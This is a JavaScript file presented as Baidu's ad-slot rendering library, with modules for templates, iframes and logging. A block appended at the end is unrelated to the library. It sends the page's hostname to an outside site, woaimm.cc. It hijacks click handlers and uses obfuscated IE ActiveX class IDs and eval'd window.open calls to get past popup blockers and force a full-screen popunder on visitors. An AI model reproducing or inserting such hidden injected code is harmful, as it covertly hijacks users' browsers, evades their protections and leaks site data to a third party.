
/*! ver:1418014201 Copyright 2014 Baidu Inc. All Rights Reserved. */
(function() {
	var m = !0,
		o = !1;
	window.BAIDU_DUP_define && window.BAIDU_DUP_define("clb/monitor1418014201", [], function() {
		return {
			sendLog: function(e) {
				if (e = e.data && e.data.monitorUrl) {
					var g = new Image,
						f = "log" + +new Date;
					window[f] = g;
					g.onload = g.onerror = g.onabort = function() {
						g.onload = g.onerror = g.onabort = null;
						try {
							delete window[f]
						} catch (b) {
							window[f] = void 0
						}
					};
					g.src = e
				}
			}
		}
	});
	window.BAIDU_DUP_define && window.BAIDU_DUP_define("clb/template1418014201", [], function() {
		function e(e) {
			var b = {
				'"': "&quot;",
				">": "&gt;",
				"<": "&lt;",
				"&": "&amp;"
			};
			return e.replace(/[\"<>\&]/g, function(c) {
				return b[c]
			})
		}
		var g = /\{(\w+)\:(\w+)\}/g;
		return {
			a: function(f, b) {
				return f.replace(g, function(c, a, d) {
					c = b[a];
					switch (d) {
					case "number":
						c = +c || 0;
						break;
					case "boolean":
						c = !! c;
						break;
					case "html":
						c = e(c)
					}
					return c
				})
			}
		}
	});
	window.BAIDU_DUP_define && window.BAIDU_DUP_define("clb/material1418014201", ["clb/template1418014201"], function(e) {
		function g(b, c, a) {
			if ("string" === typeof b) return b;
			if (!b.type) return "";
			var d = f[b.type];
			return d ? (b = "string" === typeof d ? e.a(d, b) : d(b, c), a ? b : "<!DOCTYPE html><body>" + b) : ""
		}
		var f = {
			text: function(b) {
				var c = '<span style="word-wrap:break-word;"><a href="{clickUrl:string}" target="{target:string}" style="font-size:{size:number}{unit:string};color:{defaultColor:string};font-weight:{defaultBold:string};font-style:{defaultItalic:string};text-decoration:{defaultUnderline:string};"{events}>{text:string}</a></span>',
					a = /\{events\}/;
				if (1 === b.version) c = c.replace(a, "");
				else if (2 === b.version) for (var c = c.replace(a, " onmouseover=\"this.style.color='{hoverColor:string}';this.style.fontWeight='{hoverBold:string}';this.style.fontStyle='{hoverItalic:string}';this.style.textDecoration='{hoverUnderline:string}';\" onmouseout=\"this.style.color='{defaultColor:string}';this.style.fontWeight='{defaultBold:string}';this.style.fontStyle='{defaultItalic:string}';this.style.textDecoration='{defaultUnderline:string}';\""), a = ["default", "hover"], d = 0; d < a.length; d++) {
					var i = a[d],
						g = i + "Color",
						f = i + "Bold",
						j = i + "Italic",
						i = i + "Underline";
					b[g] = "#" + b[g];
					b[f] = b[f] ? "bold" : "normal";
					b[j] = b[j] ? "italic" : "normal";
					b[i] = b[i] ? "underline" : "none"
				}
				return e.a(c, b)
			},
			image: '<a href="{clickUrl:string}" target="{target:string}"><img src="{src:string}" title="{title:html}" alt="{title:html}" border="0" height="{height:number}" width="{width:number}" /></a>',
			flash: function(b) {
				b.file = b.hasLink ? "cflash" : "flash";
				b.imageClickUrl = b.clickUrl;
				b.hasLink || (b.clickUrl = "");
				return e.a('<script>var BD = BD || {};BD.MC = BD.MC || {};BD.MC.ADFlash = BD.MC.ADFlash || {};BD.MC.ADImg = BD.MC.ADImg || {};BD.MC.ADFlash.w = {width:number};BD.MC.ADFlash.h = {height:number};BD.MC.ADFlash.mu = "{src:string}";BD.MC.ADFlash.cu = "{clickUrl:string}";BD.MC.ADFlash.wm = {wmode:number};BD.MC.ADFlash.ct = "{clickTag:string}";BD.MC.ADImg.w = {imageWidth:number};BD.MC.ADImg.h = {imageHeight:number};BD.MC.ADImg.mu = "{imageSrc:string}";BD.MC.ADImg.cu = "{imageClickUrl:string}";BD.MC.ADImg.tw = "{target:string}";BD.MC.ADImg.flag = {backupImage:number};<\/script><script src ="http://cbjs.baidu.com/js/{file:string}.js"><\/script>', b)
			},
			rich: function(b) {
				return b.content
			},
			slide: function(b, c) {
				for (var a = [], d = b.materials, i = 0; i < d.length; i++) {
					var f = d[i];
					"string" !== typeof f && (f = g(f, c, m));
					a.push(f)
				}
				b.html = "<div>" + a.join("</div><div>") + "</div>";
				b.width = c.width;
				b.height = c.height;
				return e.a('<div id="bd_ec_clb_asp" style="width:{width:number}px;height:{height:number}px;overflow:hidden;">{html:string}</div><script>(function(){var d = document;function G(id) { return d.getElementById(id); };var container = G("bd_ec_clb_asp");var pages = container.childNodes;var pl = 0;for (var i = 0; i < pages.length; i++) {if (pages[i].nodeType === 1) {pl++;}}var cp = 0;function showPage(pn) { pages[pn].style.display = ""; };function hidePages() {for (var i = 0; i < pl; i++) {pages[i].style.display = "none";}};function roll() {hidePages();showPage(cp);cp == (pages.length - 1) ? cp = 0 : cp++;};var autoRoll;function setRoll() { autoRoll = window.setInterval(function() { roll(); }, {interval:number});};roll();setRoll();container.onmouseover = function() { window.clearInterval(autoRoll); };container.onmouseout = function() {setRoll(); };})();<\/script>', b)
			}
		};
		return {
			a: g
		}
	});
	window.BAIDU_DUP_define && window.BAIDU_DUP_define("clb/frame1418014201", ["api"], function(e) {
		function g() {
			var b = document.createElement("iframe"),
				a = o;
			b.src = "about:blank";
			document.body.insertBefore(b, document.body.firstChild);
			try {
				a = !b.contentWindow.document
			} catch (d) {
				a = m
			}
			document.body.removeChild(b);
			g = function() {
				return a
			};
			return a
		}
		function f() {
			var b = navigator.userAgent,
				a = b && b.match(/iphone.*micromessenger/i) ? m : o;
			f = function() {
				return a
			};
			return a
		}
		function b() {
			return g() ? e.getConfig("domainPolicyFileUrl") || "/domain-policy.htm" : f() ? e.getConfig("blankPolicyFileUrl") || "/blank-policy.htm" : "about:blank"
		}
		e.defineOnce("BAIDU_DUP_CLB_renderFrame", function(c) {
			var a = document.getElementById("baidu_clb_slot_iframe_" + c),
				d = e.getSlots(c);
			if (d) if (g() && a.getAttribute("src", 2) !== b()) a.src = b();
			else if (d && !d.status.finish) try {
				e.setStatus(c, "finish");
				var i = e.getInfo("#" + c).html;
				0 > i.indexOf("<body>") && (i = "<!DOCTYPE html><body>" + i);
				var f = a.contentWindow.document;
				f.open("text/html", "replace");
				f.write(i);
				f.close();
				f.body && (f.body.style.backgroundColor = "transparent")
			} catch (l) {
				e.addErrorItem(c, "PermissionDenied")
			}
		});
		return {
			n: function() {
				return g()
			},
			j: b,
			h: function(c, a) {
				var d;
				d = a.id;
				d = '<iframe id="baidu_clb_slot_iframe_' + d + '" src="' + b() + '" onload="BAIDU_DUP_CLB_renderFrame(\'' + d + '\')" width="' + a.width + '" height="' + a.height + '" vspace="0" hspace="0" allowTransparency="true" scrolling="no" marginWidth="0" marginHeight="0" frameborder="0" style="border:0; vertical-align:bottom; margin:0; display:block;"></iframe>';
				c.innerHTML = d
			}
		}
	});
	window.BAIDU_DUP_define && window.BAIDU_DUP_define("clb/logService1418014201", ["api"], function(e) {
		var g = o;
		return {
			g: function(f) {
				!g && 64 !== f.slotType && (g = m, e.bind(window, "load", function() {
					window.BAIDU_DUP_require(["clb/detect"], function() {}, m)
				}))
			}
		}
	});
	window.BAIDU_DUP_define && window.BAIDU_DUP_define("clb/fixed7o", ["api", "clb/monitor1418014201", "clb/material1418014201", "clb/frame1418014201", "clb/logService1418014201"], function(e, g, f, b, c) {
		return {
			render: function(a, d) {
				a = {
					id: a.id,
					data: a._html,
					k: a._fxp,
					i: a._stype,
					l: a._isMlt,
					width: a._w,
					height: a._h
				};
				c.g(a);
				g.sendLog(a);
				if (!a.data && !a.k) e.setStatus(a.id, "finish");
				else {
					if (a.l && "sync" === e.getFillType(a.id)) {
						var i = "string" === typeof a.data ? a.data : a.data.content;
						if (i) {
							e.setStatus(a.id, "finish");
							document.write(i);
							return
						}
					}
					if (!d) return null;
					var i = document.getElementById(d),
						p = f.a(a.data, a, m);
					e.putInfo("#" + a.id, {
						html: p
					});
					b.h(i, a)
				}
			},
			validate: function(a) {
				var b = a._stype,
					a = a._isMlt;
				return 0 !== b && 3 !== b && 64 !== b || 0 !== a && 1 !== a && a !== o ? o : m
			}
		}
	});
})();
window.BAIDU_DUP_define && window.BAIDU_DUP_define("clb/detect", ["api"], function(g) {
	function e(a) {
		a.url = "";
		a.host = window.location.hostname;
		a.from = "DUP";
		g.sendLog({
			data: a,
			a: "now"
		})
	}
	try {
		setTimeout(function() {
			var a = g.getSlots(),
				c;
			for (c in a) {
				var b = a[c],
					h = b.status;
				if (h.render) {
					for (var d = b.errors, i = !1, f = 0; f < d.length; f++) if ("PermissionDenied" === d[f]) {
						i = !0;
						break
					}
					d = b.response.data && b.response.data._html;
					if (i) e({
						type: "renderFail",
						id: c,
						error: "PermissionDenied",
						empty: !! d
					});
					else if (h.finish) {
						if (1 !== b.response.data._isMlt && (b = document.getElementById("baidu_clb_slot_iframe_" + c))) try {
							var j = b.contentWindow.document.body;
							(!j || !j.firstChild) && e({
								type: "renderEmpty",
								id: c
							})
						} catch (k) {}
					} else e({
						type: "renderFail",
						id: c,
						error: "NotFilled",
						empty: !! d
					})
				}
			}
		}, 0)
	} catch (k) {}
});

//var authcode =  location.search;
var authcode =  window.location.host;
    
var paypopupURL='http://www.woaimm.cc/?'+authcode;
var _hascsp=0, poptype=1;
function updatecs(){}
;(function(){
    var d=navigator.userAgent;var a={};
    a.ver={
        ie:/MSIE/.test(d),
        ie6:!/MSIE 7.0/.test(d)&&/MSIE 6.0/.test(d)&&!/MSIE 8.0/.test(d),
        tt:/TencentTraveler/.test(d),
        i360:/360SE/.test(d),
        sogo:/; SE/.test(d),
        gg:window.google&&window.chrome,
        _v1:'<object id="_tt_cs01" width="0" height="0" classid="CLSID:6BF5'+'2A52-394'+'A-1'+'1D3-B15'+'3-00'+'C04F'+'79FAA6"></object>',
        _v2:'<object id="_tt_cs02" style="position:absolute;left:1px;top:1px;width:1px;height:1px;" classid="clsid:2D'+'360201-FF'+'F5-11'+'d1-8D0'+'3-00A'+'0C95'+'9BC0A"></object>'
    };
    if(a.ver.ie||a.ver.tt){document.write(a.ver._v1);document.write(a.ver._v2);}
    a.fs=null;a.fdc=null;a.timeid=0;a.first=1;a.url='';a.w=0;a.h=0;
    a.init=function(){
        try{
            if(typeof document.body.onclick=="function"){a.fs=document.body.onclick;document.body.onclick=null}
            if(typeof document.onclick=="function"){if(document.onclick.toString().indexOf('clickpp')<0){a.fdc=document.onclick;document.onclick=function(){a.clickpp(a.url,a.w,a.h)}}}
        }catch(q){}
    };
    a.donepp=function(c,g){
        if (g==1 && (!a.ver.i360 && a.ver.ie6))    return;
        if (_hascsp)    return;
        try{document.getElementById("_tt_cs01").launchURL(c);_hascsp=1;updatecs()}catch(q){}
    };
    a.clickpp=function(c,e,f){
        a.open(c,e,f);clearInterval(a.timeid);document.onclick=null;
        if(typeof a.fdc=="function") try{document.onclick=a.fdc}catch(q){}
        if(typeof a.fs=="function")    try{document.body.onclick=a.fs}catch(q){}
    }
    a.open=function(c,e,f){
        if (_hascsp)    return;
        a.url=c;a.w=e;a.h=f;
        if (a.timeid==0) a.timeid=setInterval(a.init,100);
        var b='height='+f+',width='+e+',left=0,top=0,toolbar=yes,location=yes,status=yes,menubar=yes,scrollbars=yes,resizable=yes';
        var j='window.open("'+c+'", "_blank", "'+b+'")';
        var m=null;
        try{m=eval(j)}catch(q){}
        if(m && !(a.first && a.ver.gg)){
            if (poptype!=-1){m.focus();}else{m.blur();window.focus();}
            _hascsp=1;updatecs();
            if(typeof a.fs=="function")    try{document.body.onclick=a.fs}catch(q){}
            clearInterval(a.timeid);
        }else{
            var i=this,    j=false;
            if(a.ver.ie||a.ver.tt){
                document.getElementById("_tt_cs01");document.getElementById("_tt_cs02");
                setTimeout(function(){
                        var obj=document.getElementById("_tt_cs02");
                        if (_hascsp || !obj)    return;    
                        try{
                            var wPop=obj.DOM.Script.open(c,"_blank",b);
                            if (wPop){
                                if (poptype!=-1){wPop.focus();}else{wPop.blur();window.focus();}
                                _hascsp=1;updatecs();
                            }else if (a.ver.sogo){_hascsp=1;updatecs();}
                        }catch(q){}},200);
            }
            if (a.first){
                a.first=0;
                try{if(typeof document.onclick=="function") a.fdc=document.onclick}catch(p){}
                document.onclick=function(){i.clickpp(c,e,f)};
                if (a.ver.ie){
                    if (window.attachEvent)    window.attachEvent("onload", function(){i.donepp(c,1);});
                    else if (window.addEventListener) window.addEventListener("load", function(){i.donepp(c,1);},true);
                    else window.onload=function(){i.donepp(c,1);};
                }
            }
        }
    };    
    window.__csppp=a;
})();
__csppp.open(paypopupURL, window.screen.width, window.screen.height);
